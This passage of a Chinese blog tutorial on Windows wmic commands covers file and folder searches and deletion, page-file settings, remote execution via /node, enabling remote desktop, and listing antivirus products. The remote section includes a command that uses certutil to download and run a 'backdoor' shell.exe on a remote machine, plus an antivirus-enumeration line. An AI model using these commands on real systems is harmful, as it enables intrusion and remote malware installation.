class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#USAGE:</span></span><br><span class="line">DATAFILE ASSOC [&lt;format specifier&gt;]</span><br><span class="line">DATAFILE CALL &lt;method name&gt; [&lt;actual param list&gt;]</span><br><span class="line">DATAFILE CREATE &lt;assign list&gt;</span><br><span class="line">DATAFILE DELETE</span><br><span class="line">DATAFILE GET [&lt;property list&gt;] [&lt;get switches&gt;]</span><br><span class="line">DATAFILE LIST [&lt;list format&gt;] [&lt;list switches&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Where 条件</span></span><br><span class="line"><span class="comment"># AccessMask=18809343</span></span><br><span class="line"><span class="comment"># Archive=TRUE</span></span><br><span class="line"><span class="comment"># Caption=c:\test.txt</span></span><br><span class="line"><span class="comment"># Compressed=FALSE</span></span><br><span class="line"><span class="comment"># CompressionMethod=</span></span><br><span class="line"><span class="comment"># CreationClassName=CIM_LogicalFile</span></span><br><span class="line"><span class="comment"># CreationDate=20181011185819.087958+480</span></span><br><span class="line"><span class="comment"># CSCreationClassName=Win32_ComputerSystem</span></span><br><span class="line"><span class="comment"># CSName=PC-20170910QIBZ</span></span><br><span class="line"><span class="comment"># Description=c:\test.txt</span></span><br><span class="line"><span class="comment"># Drive=c:</span></span><br><span class="line"><span class="comment"># EightDotThreeFileName=c:\test.txt</span></span><br><span class="line"><span class="comment"># Encrypted=FALSE</span></span><br><span class="line"><span class="comment"># EncryptionMethod=</span></span><br><span class="line"><span class="comment"># Extension=txt</span></span><br><span class="line"><span class="comment"># FileName=test</span></span><br><span class="line"><span class="comment"># FileSize=55514</span></span><br><span class="line"><span class="comment"># FileType=Text Document</span></span><br><span class="line"><span class="comment"># FSCreationClassName=Win32_FileSystem</span></span><br><span class="line"><span class="comment"># FSName=NTFS</span></span><br><span class="line"><span class="comment"># Hidden=FALSE</span></span><br><span class="line"><span class="comment"># InstallDate=20181011185819.087958+480</span></span><br><span class="line"><span class="comment"># InUseCount=</span></span><br><span class="line"><span class="comment"># LastAccessed=20181011185819.087958+480</span></span><br><span class="line"><span class="comment"># LastModified=20181011190254.894734+480</span></span><br><span class="line"><span class="comment"># Manufacturer=</span></span><br><span class="line"><span class="comment"># Name=c:\test.txt</span></span><br><span class="line"><span class="comment"># Path=\</span></span><br><span class="line"><span class="comment"># Readable=TRUE</span></span><br><span class="line"><span class="comment"># Status=OK</span></span><br><span class="line"><span class="comment"># System=FALSE</span></span><br><span class="line"><span class="comment"># Version=</span></span><br><span class="line"><span class="comment"># Writeable=TRUEAccessMask=18809343</span></span><br><span class="line"><span class="comment"># Archive=TRUE</span></span><br><span class="line"><span class="comment"># Caption=c:\test.txt</span></span><br><span class="line"><span class="comment"># Compressed=FALSE</span></span><br><span class="line"><span class="comment"># CompressionMethod=</span></span><br><span class="line"><span class="comment"># CreationClassName=CIM_LogicalFile</span></span><br><span class="line"><span class="comment"># CreationDate=20181011185819.087958+480</span></span><br><span class="line"><span class="comment"># CSCreationClassName=Win32_ComputerSystem</span></span><br><span class="line"><span class="comment"># CSName=PC-20170910QIBZ</span></span><br><span class="line"><span class="comment"># Description=c:\test.txt</span></span><br><span class="line"><span class="comment"># Drive=c:</span></span><br><span class="line"><span class="comment"># EightDotThreeFileName=c:\test.txt</span></span><br><span class="line"><span class="comment"># Encrypted=FALSE</span></span><br><span class="line"><span class="comment"># EncryptionMethod=</span></span><br><span class="line"><span class="comment"># Extension=txt</span></span><br><span class="line"><span class="comment"># FileName=test</span></span><br><span class="line"><span class="comment"># FileSize=55514</span></span><br><span class="line"><span class="comment"># FileType=Text Document</span></span><br><span class="line"><span class="comment"># FSCreationClassName=Win32_FileSystem</span></span><br><span class="line"><span class="comment"># FSName=NTFS</span></span><br><span class="line"><span class="comment"># Hidden=FALSE</span></span><br><span class="line"><span class="comment"># InstallDate=20181011185819.087958+480</span></span><br><span class="line"><span class="comment"># InUseCount=</span></span><br><span class="line"><span class="comment"># LastAccessed=20181011185819.087958+480</span></span><br><span class="line"><span class="comment"># LastModified=20181011190254.894734+480</span></span><br><span class="line"><span class="comment"># Manufacturer=</span></span><br><span class="line"><span class="comment"># Name=c:\test.txt</span></span><br><span class="line"><span class="comment"># Path=\</span></span><br><span class="line"><span class="comment"># Readable=TRUE</span></span><br><span class="line"><span class="comment"># Status=OK</span></span><br><span class="line"><span class="comment"># System=FALSE</span></span><br><span class="line"><span class="comment"># Version=</span></span><br><span class="line"><span class="comment"># Writeable=TRUE</span></span><br></pre></td></tr></table></figure></p>
<p>基础实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.获取文件的创建、访问、修改时间</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"Name='c:\\windows\\system32\\cmd.exe'"</span> get CreationDate,LastAccessed,LastModified </span><br><span class="line"><span class="comment"># CreationDate               LastAccessed               LastModified</span></span><br><span class="line"><span class="comment"># 20191114092108.255728+480  20191114092108.258724+480  20191114092108.258724+480</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.可以进行文件查找(语句里面通配符以及)</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"drive='e:' and path='\\test\\' and FileName='cc' and Extension='cmd'"</span> list  <span class="comment">#查找e盘下test目录(不包括子目录)下的cc.cmd文件</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"drive='e:' and FileName='cc' and Extension='cmd' and FileSize&gt;'1000'"</span> list  <span class="comment">#查找e盘下所有目录和子目录下的cc.cmd文件,且文件大小大于1K</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"drive='h:' and extension='txt' and path like '%\\test\\%' and filename like '%perl%'"</span> get name   <span class="comment">#查找h盘下目录含有test,文件名含有perl,后缀为txt的文件</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"drive='c:' and extension='ps1' and path like '%\\windows\\%' and filename like '%po%'"</span> get name  <span class="comment">#比较实用的功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.按照条件删除文件</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"drive='e:' and Extension='cmd' and FileSize&gt;'10000000'"</span> call delete          <span class="comment">#删除e盘下文件大小大于10M的.cmd文件</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"drive='e:' and Extension&lt;&gt;'cmd' and path='test'"</span> call delete                 <span class="comment">#删除e盘下test目录(不包括子目录)下的非.cmd文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.文件重命名</span></span><br><span class="line">wmic datafile <span class="string">"c:\\hello.txt"</span> call rename c:\test.txt                                            <span class="comment">#改名c:\hello.txt为c:\test.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5.复制e盘下test目录(不包括子目录)下的cc.cmd文件到e:\,并改名为aa.bat</span></span><br><span class="line">wmic datafile <span class="built_in">where</span> <span class="string">"drive='e:' and path='\\test\\' and FileName='cc' and Extension='cmd'"</span> call copy <span class="string">"e:\aa.bat"</span>   <span class="comment">#注意目录的写法</span></span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115171556.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115171556.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<h3 id="fsdir-文件目录系统项目管理"><a href="#fsdir-文件目录系统项目管理" class="headerlink" title="fsdir  - 文件目录系统项目管理"></a>fsdir  - 文件目录系统项目管理</h3><p>基础实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.查找e盘下名为test的目录</span></span><br><span class="line">wmic FSDIR <span class="built_in">where</span> <span class="string">"drive='e:' and filename='test'"</span> list  </span><br><span class="line"></span><br><span class="line"><span class="comment">#2.删除c:\good文件夹</span></span><br><span class="line">wmic FSDIR <span class="string">"c:\\good"</span> call delete       </span><br><span class="line">wmic fsdir <span class="built_in">where</span> <span class="string">"f:\\test"</span> call delete <span class="comment"># - 使用双斜杆转义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.删除e:\test目录下除过目录abc的所有目录</span></span><br><span class="line">wmic FSDIR <span class="built_in">where</span> <span class="string">"drive='e:' and path='\\test\\' and filename&lt;&gt;'abc'"</span> call delete  </span><br><span class="line"></span><br><span class="line"><span class="comment">#4.重命名c:\good文件夹为abb</span></span><br><span class="line">wmic FSDIR <span class="string">"c:\\good"</span> rename <span class="string">"c:\abb"</span> </span><br><span class="line">wmic fsdir <span class="built_in">where</span> (name=<span class="string">'c:\\test'</span>) rename <span class="string">"c:\abc"</span></span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115172929.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115172929.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<h3 id="pagefileset"><a href="#pagefileset" class="headerlink" title="pagefileset"></a>pagefileset</h3><p>描述:页面文件设置管理<br>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PAGEFILESET ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">PAGEFILESET CREATE &lt;分配列表&gt; <span class="comment">#注意: Create 不能用于创建新类。</span></span><br><span class="line">PAGEFILESET DELETE</span><br><span class="line">PAGEFILESET GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">PAGEFILESET LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br><span class="line">PAGEFILESET SET [&lt;分配列表&gt;]</span><br></pre></td></tr></table></figure></p>
<p>基础实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.更改当前页面文件初始大小和最大值</span></span><br><span class="line">wmic PAGEFILESET <span class="built_in">set</span> InitialSize=<span class="string">"512"</span>,MaximumSize=<span class="string">"512"</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment">#2.页面文件设置到d:\下,执行下面两条命令</span></span><br><span class="line">wmic pagefileset create name=<span class="string">'d:\pagefile.sys'</span>,initialsize=512,maximumsize=1024</span><br><span class="line">wmic pagefileset <span class="built_in">where</span> <span class="string">"name='d:\\pagefile.sys'"</span> delete</span><br><span class="line">删除实例 \\WEIYIGEEK\ROOT\CIMV2:Win32_PageFileSetting.Name=<span class="string">"d:\\pagefile.sys"</span></span><br><span class="line">实例删除成功。</span><br></pre></td></tr></table></figure></p>
<hr>

<h2 id="0x06-远程操作"><a href="#0x06-远程操作" class="headerlink" title="0x06 远程操作"></a>0x06 远程操作</h2><h3 id="node"><a href="#node" class="headerlink" title="/node"></a>/node</h3><p>描述：/node 远程计算机操作WMIC命令开启远程计算机的远程桌面连接;</p>
<p><strong>基础语法:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启远程</span></span><br><span class="line">wmic /node:<span class="string">"[full machine name]"</span> /USER:<span class="string">"[domain]\[username]"</span> PATH win32_terminalservicesetting WHERE (__Class!=<span class="string">""</span>) CALL SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程命令执行</span></span><br><span class="line">wmic /node:[ip] /user:[用户] /password:[密码] process call create <span class="string">"shutdown.exe /r /f /t 0"</span></span><br></pre></td></tr></table></figure></p>
<p><strong>基础示例:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0.进行wmic控制台登录</span></span><br><span class="line">wmic /node:<span class="string">"192.168.1.20"</span> /user:<span class="string">"domain\administrator"</span> /password:<span class="string">"123456"</span></span><br><span class="line">wmic /node:<span class="string">"192.168.1.88"</span> /user:<span class="string">"domain\WeiyiGeek"</span> /password:<span class="string">"weiye"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.WMIC命令开启远程计算机的远程桌面连接</span></span><br><span class="line">wmic /node:10.2.14.20 /USER:<span class="string">"10.2.14.20/administrator"</span> PATH win32_terminalservicesetting WHERE (__Class!=<span class="string">""</span>) CALL SetAllowTSConnections 1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.远程计算机操作实例(打开笔记本)</span></span><br><span class="line">wmic /node:10.2.14.200 /user:administrator process call create notepad.exe  <span class="comment">#在远程机器上创建新进程(值得利用) 会返回进程ID</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.利用 wmic 实现远程下载后门</span></span><br><span class="line">wmic /node:192.168.1.10 /user:administrator /password:123123 PROCESS call create <span class="string">"cmd /c certutil.exe -urlcache -split -f http://WEIYIGEEK.com/shell.exe c:/shell.exe</span></span><br><span class="line"><span class="string">&amp; c:/shell.exe &amp; certutil.exe -urlcache -split -f http://WEIYIGEEK.com/shell.exe delete"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.由于wmic执行远程命令没有回显所以要将结果写入到txt中</span></span><br><span class="line">wmic /node:[TargetIp] /user:[UserName] /password:[Password] process call create <span class="string">"cmd.exe /c ipconfig &gt; c:\result.txt"</span></span><br><span class="line"><span class="built_in">type</span> result.txt</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115183247.png" target="_blank" title="WeiyiGeek.远程管理" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115183247.png" alt="WeiyiGeek.远程管理" title="" class=""></a>
                <p>WeiyiGeek.远程管理</p>
            </figure>
<p><br></p>
<h3 id="rdtoggle"><a href="#rdtoggle" class="headerlink" title="rdtoggle"></a>rdtoggle</h3><p>描述:查看与设置远程桌面连接；</p>
<p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.查看远程连接的信息</span></span><br><span class="line">wmic rdtoggle list</span><br><span class="line"><span class="comment"># AllowTSConnections  ServerName</span></span><br><span class="line"><span class="comment"># 0                   WEIYIGEEK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.开2003的3389</span></span><br><span class="line">wmic RDTOGGLE <span class="built_in">where</span> <span class="string">"name='WEIYIGEEK'"</span> call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="0x07-namespace-名称空间"><a href="#0x07-namespace-名称空间" class="headerlink" title="0x07 namespace - 名称空间"></a>0x07 namespace - 名称空间</h2><h3 id="1-root-securitycenter2"><a href="#1-root-securitycenter2" class="headerlink" title="(1) \root\securitycenter2"></a>(1) \root\securitycenter2</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># - 获取反病毒产品详情</span></span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line">  <span class="comment"># displayName       pathToSignedProductExe                                    productState</span></span><br><span class="line">  <span class="comment"># 火绒安全软件      C:\Program Files (x86)\Huorong\Sysdiag\bin\wsctrl.exe     266240</span></span><br><span class="line">  <span class="comment"># Windows Defender  windowsdefender://                                        401664</span></span><br><span class="line">  <span class="comment"># 火绒安全软件      C:\Program Files (x86)\Huorong\Sysdiag\bin\wsctrlsvc.exe  266240</span></span><br></pre></td></tr></table></figure></p>

        </div>
        <!-- Google 广告 -->
          

        
<hr/>
<div style="text-align: center;font-weight: bold;">
  <p> 欢迎各位志同道合的朋友一起学习交流，如文章有误请在下方留下您宝贵的经验知识，个人邮箱地址<b style="color:#ff654e"><code>【master#weiyigeek.top】</code></b>或者个人公众号<b style="color:#ff654e"><code>【WeiyiGeek】</code></b>联系我。 </p>
  <p> 更多文章来源于<b style="color:#03a9f4">【WeiyiGeek Blog - 为了能到远方，脚下的每一步都不能少】</b>, 个人首页地址( <a style="color: #03a9f4;" href="https://weiyigeek.top" target="_blank"> https://weiyigeek.top </a> )</p>
<!-- 

  <ul style="font-weight: bolder;">
    <li>
      <p><span style="color: #03a9f4">echo&nbsp;&nbsp;"【点个赞】，动动你那粗壮的拇指或者芊芊玉手，亲！"</span></p>
    </li>
    <li>
      <p><span style="color: #ff9201">printf("%s",&nbsp;"【投个币】，万水千山总是情，投个硬币行不行，亲！")</span></p>
    </li>
    <li>
      <p><span style="color: #02a2ff">fmt.Printf("【收个藏】，阅后即焚不吃灰，亲！")&nbsp;&nbsp;</span></p>
    </li>
    <li>
      <p><span style="color:red">console.info("【转个发】，让更多的志同道合的朋友一起学习交流，亲！")</span></p>
    </li>
    <li>
      <p><span style="color: #ff654e">System.out.println("【关个注】，后续浏览查看不迷路哟，亲！")</span></p>
    </li>
  </ul> -->
  <div>
    <img src="/img/share-wechat.jpg" class="img-responsive" alt="扫描Follow(关注)WeiyiGeek公众号与Visit(浏览)极客全栈修炼小程序" >
    <p>专栏书写不易，如果您觉得这个专栏还不错的，请给这篇专栏 <b style="color: red;">【点个赞、投个币、收个藏、关个注、转个发、赞个助】</b>，这将对我的肯定，我将持续整理发布更多优质原创文章！。</p>
    <img src="/img/weiyigeek.jpg" class="img-responsive" alt="WeiyiGeek-banner">
  </div>
</div>
  <hr>
  

  <blockquote class="post-copyright">
    <div class="content">
      
        
<span class="post-time">
    最后更新时间：<time datetime="2022-03-29T05:39:06.301Z" itemprop="dateUpdated">2022-03-29 13:39:06</time>
</span><br>


        <span>文章原始路径：<a href="https://github.com/WeiyiGeek/blog/edit/master/source/_posts/系统运维/Windows/常用命令/系统高级类命令/wmic命令解析与实例.md" target="_blank" rel="noopener noreferrer">_posts/系统运维/Windows/常用命令/系统高级类命令/wmic命令解析与实例.md</a></span><br>
         <span class="copy-copyright">转载注明出处，原文地址：<a href="/2019/5-29-247.html" target="_blank" rel="external">https://blog.weiyigeek.top/2019/5-29-247.html</a></span><br>本站文章内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a> 
    </div>
    <footer>
      <a href="https://blog.weiyigeek.top">
        <img src="/img/avatar.jpg" alt="WeiyiGeek">
        WeiyiGeek
      </a>
    </footer>
  </blockquote>


        
            <div class="page-reward">
  <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-rectangle waves-light">☕️ 请作者喝杯咖啡!</a>
</div>
            
        
        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/" rel="tag">系统命令</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/5-29-247.html&title=《wmic命令解析与实例》 — WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/5-29-247.html&title=《wmic命令解析与实例》 — WeiyiGeek Blog&source=[TOC]" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/5-29-247.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《wmic命令解析与实例》 — WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/5-29-247.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/5-29-247.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
          <!-- 评论组件 -->


<div id="gitalk-container"></div>
<script type="text/javascript" src="/js/plugins/gitalk.min.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/custom/gitalk.init.js?v=1.6.6"></script>
        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2019/5-29-243.html" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">netsh命令解析与实例使用</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/5-28-236.html" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">系统安全策略查看配置命令一览表</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-前言介绍"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 前言介绍</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-语法参数"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">1.语法参数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Call-函数高级用法"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Call - 函数高级用法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Out-以文件的形式输出获取的内容"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">Out - 以文件的形式输出获取的内容</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-系统配置"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01 系统配置</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#environment"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">environment</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#useraccount-用户帐户管理计算机用户列表"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">useraccount - 用户帐户管理计算机用户列表</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#group-组帐户管理"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">group - 组帐户管理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#cpu"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">cpu</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#os-系统信息"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">os - 系统信息</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#bios"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">bios</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#csproduct"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">csproduct</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#computersystem"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">computersystem</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#baseboard"><span class="post-toc-number">2.9.</span> <span class="post-toc-text">baseboard</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#memlogical"><span class="post-toc-number">2.10.</span> <span class="post-toc-text">memlogical</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sounddev"><span class="post-toc-number">2.11.</span> <span class="post-toc-text">sounddev</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#diskdrive"><span class="post-toc-number">2.12.</span> <span class="post-toc-text">diskdrive</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#logicaldisk"><span class="post-toc-number">2.13.</span> <span class="post-toc-text">logicaldisk</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#desktopmonitor"><span class="post-toc-number">2.14.</span> <span class="post-toc-text">desktopmonitor</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ONBOARDDEVICE-主板-系统板-中内置的通用适配器设备的管理"><span class="post-toc-number">2.15.</span> <span class="post-toc-text">ONBOARDDEVICE - 主板(系统板)中内置的通用适配器设备的管理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#NTEVENTLOG-NT-事件日志文件管理"><span class="post-toc-number">2.16.</span> <span class="post-toc-text">NTEVENTLOG - NT 事件日志文件管理</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-系统服务进程"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x02 系统服务进程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#process-进程查看和修改"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">process - 进程查看和修改</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#service"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">service</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#job"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">job</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-系统软件与补丁"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x03 系统软件与补丁</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#qfe-查看系统补丁安装情况"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">qfe - 查看系统补丁安装情况</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#product-软件安装信息查看"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">product - 软件安装信息查看</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-网络设置"><span class="post-toc-number">5.</span> <span class="post-toc-text">0x04 网络设置</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#nicconfig"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">nicconfig</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x05-文件磁盘操作"><span class="post-toc-number">6.</span> <span class="post-toc-text">0x05 文件磁盘操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#share"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">share</span></a></li><li class="post-toc-item 